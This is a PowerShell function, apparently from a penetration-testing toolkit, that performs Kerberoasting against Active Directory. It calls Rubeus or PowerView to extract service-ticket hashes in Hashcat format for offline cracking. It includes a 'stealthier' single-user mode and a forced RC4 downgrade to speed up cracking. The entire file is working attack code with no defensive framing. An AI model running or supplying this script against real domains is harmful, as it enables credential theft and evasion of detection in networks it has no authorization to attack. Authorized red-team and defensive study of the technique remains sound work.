function Invoke-QuickKerberoast {
    <#
    .SYNOPSIS
        Extract Kerberoast TGS hashes using Rubeus or PowerView.

    .DESCRIPTION
        Automatically detects available tooling (Rubeus.exe or Invoke-Kerberoast)
        and extracts TGS hashes in Hashcat format. Supports single-user targeting
        and RC4 downgrade via /tgtdeleg for faster offline cracking.

    .PARAMETER OutputDir
        Directory to write hash files. Created if it doesn't exist.

    .PARAMETER User
        Optional single username to target (stealthier than bulk roasting).

    .PARAMETER RC4Only
        Force RC4 downgrade via Rubeus /tgtdeleg for faster cracking.

    .EXAMPLE
        Invoke-QuickKerberoast -OutputDir C:\Temp\Roast
    .EXAMPLE
        Invoke-QuickKerberoast -User svc_sql -RC4Only
    #>

    param(
        [string]$OutputDir = "C:\Temp\Roast",
        [string]$User      = $null,
        [switch]$RC4Only
    )

    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    Write-Host "`n[*] Kerberoasting..." -ForegroundColor Cyan

    $hashFile = "$OutputDir\kerberoast_hashes.txt"

    if (Test-Path ".\Rubeus.exe") {
        $rubeusArgs = "kerberoast /outfile`"$hashFile`""
        if ($User)    { $rubeusArgs += " /user:$User" }
        if ($RC4Only) { $rubeusArgs += " /tgtdeleg" }
        & .\Rubeus.exe $rubeusArgs.Split(' ')
    }
    elseif (Get-Command Invoke-Kerberoast -ErrorAction SilentlyContinue) {
        if ($User) {
            Invoke-Kerberoast -Identity $User -OutputFormat Hashcat |
                Select-Object -ExpandProperty Hash |
                Out-File $hashFile
        }
        else {
            Invoke-Kerberoast -OutputFormat Hashcat |
                Select-Object -ExpandProperty Hash |
                Out-File $hashFile
        }
    }
    else {
        Write-Host "[-] No Kerberoast tool available. Load Rubeus or PowerView." -ForegroundColor Red
        return
    }

    Write-Host "[+] Hashes saved to $OutputDir" -ForegroundColor Green
}